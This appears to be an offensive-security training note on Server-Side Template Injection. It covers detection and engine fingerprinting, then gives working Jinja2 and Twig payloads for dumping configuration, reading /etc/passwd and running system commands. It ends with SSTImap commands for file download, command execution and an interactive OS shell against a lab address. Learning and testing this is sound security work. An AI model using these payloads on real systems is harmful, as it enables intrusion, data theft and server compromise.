# How does it work?
Web applications can utilize templating engines and server-side templates to generate responses such as HTML content dynamically. This generation is often based on user input, enabling the web application to respond to user input dynamically. When an attacker can inject template code, a [Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection) vulnerability can occur. SSTI can lead to various security risks, including data leakage and even full server compromise via remote code execution.
## Templating
Template engines typically require two inputs: a template and a set of values to be inserted into the template. The template can typically be provided as a string or a file and contains pre-defined places where the template engine inserts the dynamically generated values. The values are provided as key-value pairs so the template engine can place the provided value at the location in the template marked with the corresponding key. Generating a string from the input template and input values is called `rendering`.
```jinja2
Hello {{ name }}!
```
# Server-side Template Injection (SSTI)
>There are also SSTI cheat sheets that bundle payloads for popular template engines, such as the [PayloadsAllTheThings SSTI CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md).

If templating is implemented correctly, user input is always provided to the rendering function in values and never in the template string. However, SSTI can occur when user input is inserted into the template **before** the rendering function is called on the template. 

A different instance would be if a web application calls the rendering function on the same template multiple times. If user input is inserted into the output of the first rendering process, it would be considered part of the template string in the second rendering process, potentially resulting in SSTI. 

Lastly, web applications enabling users to modify or submit existing templates result in an obvious SSTI vulnerability.
## Identifying SSTI
### Confirming SSTI
The process of identifying an SSTI vulnerability is similar to the process of identifying any other injection vulnerability, such as SQL injection. 

We can inject special characters with semantic meaning in template engines and observe the web application's behavior. 

The following test string is commonly used to provoke an error message in a web application vulnerable to SSTI, as it consists of all special characters that have a particular semantic purpose in popular template engines:
```
${{<%[%'"}}%\.
```
- Since the above test string should almost certainly violate the template syntax, it should result in an error if the web application is vulnerable to SSTI.

We can test any injection point - from an input field from the user, to the end of a url that is calling for the retrieval of an object / value.
### Identifying the Template Engine
We first need to determine the template engine used by the web application by testing these payloads.
![image](https://academy.hackthebox.com/storage/modules/145/ssti/diagram.png)
## Exploiting SSTI - Jinja2
We will assume that we have successfully identified that the web application uses the `Jinja` template engine.

In our payload, we can freely use any libraries that are already imported by the Python application, either directly or indirectly. Additionally, we may be able to import additional libraries through the use of the `import` statement.
#### Information Disclosure
We can obtain internal information about the web application, including configuration details and the web application's source code.

We can obtain the web application's configuration using the following SSTI payload:
```jinja2
{{ config.items() }}
```
- dumps the entire web application configuration

With the information from this, we can prepare further attacks using the obtained information. We can also execute Python code to obtain information about the web application's source code. 

We can use the following SSTI payload to dump all available built-in functions:
```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```
#### Local File Inclusion (LFI)
We can use Python's built-in function `open` to include a local file. We need to call it from the `__builtins__` dictionary we dumped earlier. This results in the following payload to include the file `/etc/passwd`:
```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```
#### Remote Code Execution (RCE)
We can use functions provided by the `os` library, such as `system` or `popen`.

If the web application has not already imported this library, we must first import it by calling the built-in function `import`. This results in the following SSTI payload:
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
## Exploiting SSTI - Twig
#### Information Disclosure
In Twig, we can use the `_self` keyword to obtain a little information about the current template:
```twig
{{ _self }}
```
#### Local File Inclusion (LFI)
Reading local files is not possible using internal functions directly provided by Twig. 

However, the PHP web framework [Symfony](https://symfony.com/) defines additional Twig filters. One of these filters is [file_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files:
```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```
#### Remote Code Execution (RCE)
We can use a PHP built-in function such as `system`. 

We can pass an argument to this function by using Twig's `filter` function, resulting in any of the following SSTI payloads:
```twig
{{ ['cat /flag.txt'] | filter('system') }}
```
## Tools of the Trade
The most popular tool for identifying and exploiting SSTI vulnerabilities was [tplmap](https://github.com/epinna/tplmap), but it is not maintained and deprecated, so we will use [SSTImap](https://github.com/vladko312/SSTImap) to aid in SSTI.

We can run it after cloning the repository and installing the required dependencies:
```bash
git clone https://github.com/vladko312/SSTImap

cd SSTImap

pip3 install -r requirements.txt

python3 sstimap.py 
```

To automatically identify any SSTI vulnerabilities as well as the template engine used by the web application, we need to provide SSTImap with the target URL:
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```

We can download a remote file to our local machine using the `-D` flag:
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
```

We can execute a system command using the `-S` flag:
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
```

We can use `--os-shell` to obtain an interactive shell:
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```